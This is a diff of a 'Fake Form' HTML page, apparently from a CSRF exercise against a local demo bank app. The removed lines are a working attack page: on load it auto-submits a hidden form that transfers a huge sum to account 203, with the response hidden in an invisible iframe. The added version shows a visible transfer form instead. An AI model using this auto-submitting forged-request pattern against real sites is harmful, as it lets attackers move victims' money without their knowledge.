@@ -3,10 +3,21 @@
     <title>Fake Form</title>
   </head>
   <body onload="document.bank_form.submit()">
-    <form method="POST" action="http://svb:5003/transfer/202" name="bank_form" style="display: none;" target="hidden_results" >
-      <input class="input is-large" type="text" name="amount" placeholder="Amount" value="100000000000" />
-      <input class="input is-large" type="text" name="account" placeholder="To account number" value="203" />
-    </form>
-    <iframe name="hidden_results" style="display: none;"></iframe>
+    <div class="box">
+        <h3 class="title has-text-black">Transfer</h3>
+        <form method="POST" action="http://svb:5003/transfer">
+            <div class="field">
+                <div class="control">
+                    <input class="input is-large" type="text" name="amount" placeholder="Amount" value="100000000000" />
+                </div>
+            </div>
+            <div class="field">
+                <div class="control">
+                    <input class="input is-large" type="text" name="account" placeholder="To account number" value="203" />
+                </div>
+            </div>
+            <button class="button is-block is-info is-large is-fullwidth">Transfer</button>
+        </form>
+    </div>
   </body>
 </html>
